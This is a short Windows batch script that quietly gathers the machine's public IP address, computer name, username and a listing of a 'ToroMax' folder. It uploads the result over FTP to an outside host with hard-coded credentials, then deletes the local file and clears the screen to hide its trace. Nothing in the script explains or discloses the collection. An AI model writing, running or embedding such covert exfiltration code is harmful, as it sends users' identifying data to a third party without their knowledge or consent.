@echo off
Color 9
cd "C:\Users\%username%\AppData\Local\Temp\"
curl ifconfig.me >> IP~%computername%~%username%.txt
dir "C:\Users\%username%\ToroMax\" >> IP~%computername%~%username%.txt
curl.exe -u amaguadalupekoa.eu5.org:kktua124 -T IP~%computername%~%username%.txt ftp://amaguadalupekoa.eu5.org/ToroMax/
del IP~%computername%~%username%.txt /F
cls
exit
